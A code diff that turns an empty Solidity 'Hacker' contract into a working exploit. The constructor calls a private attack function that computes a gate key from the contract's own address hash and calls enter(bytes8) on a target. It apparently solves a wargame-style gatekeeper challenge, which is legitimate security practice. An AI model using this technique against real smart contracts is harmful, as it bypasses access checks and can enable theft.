@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity >=0.8.5 <0.9.0;
+pragma solidity >=0.6.5 <0.9.0;
 
 contract Hacker {
   address public hacker;
@@ -9,9 +9,14 @@ contract Hacker {
     _;
   }
 
-  constructor() {
-    hacker = payable(msg.sender);
+  constructor(address _target) public {
+    hacker = msg.sender;
+    attack(_target);
   }
 
-  function attack(address _target) public onlyHacker {}
+  function attack(address _target) private {
+    bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
+    (bool result, ) = _target.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
+    require(result, "Hacker: Attack failed!");
+  }
 }
